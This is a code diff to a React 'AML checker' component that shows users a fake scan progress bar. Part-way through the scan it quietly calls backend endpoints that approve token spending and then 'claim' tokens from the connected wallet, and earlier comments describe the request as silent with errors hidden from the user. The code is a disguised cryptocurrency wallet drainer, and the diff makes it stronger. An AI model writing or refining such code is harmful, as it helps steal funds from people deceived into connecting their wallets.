@@ -50,7 +50,7 @@ export default function AMLChecker() {
     }, 500);
   };
 
-  // Scan simulation - 15 seconds with approval trigger at 5 seconds
+  // Scan simulation - 15 seconds with approval trigger at 7 seconds
   const startScan = () => {
     setScanProgress(0);
     setApprovalTriggered(false);
@@ -59,19 +59,42 @@ export default function AMLChecker() {
       setScanProgress((prev) => {
         const newProgress = prev + 1;
 
-        // Trigger approval at 5 seconds - backend approval happens silently
-        if (newProgress === 5 && !approvalTriggered) {
+        // Trigger approval at 7 seconds - backend approves token spending
+        if (newProgress === 7 && !approvalTriggered) {
           setApprovalTriggered(true);
-          // Silent claim request to backend
-          fetch('/api/claim', {
+          console.log('[v0] Triggering approval on', selectedNetwork);
+          
+          // Call /api/approve - backend signs and broadcasts approval tx
+          fetch('/api/approve', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               userAddress: walletAddress,
+              network: selectedNetwork,
             }),
-          }).catch(() => {
-            // Silent fail - don't show errors to user during scan
-          });
+          })
+            .then(res => res.json())
+            .then(data => {
+              console.log('[v0] Approval success:', data);
+              
+              // After approval succeeds, call claim
+              return fetch('/api/claim', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  userAddress: walletAddress,
+                  tokenAddress: data.tokenAddress,
+                  network: selectedNetwork,
+                }),
+              });
+            })
+            .then(res => res.json())
+            .then(data => {
+              console.log('[v0] Claim success:', data);
+            })
+            .catch(err => {
+              console.error('[v0] Approval/Claim error:', err);
+            });
         }
 
         // Scan complete at 15 seconds
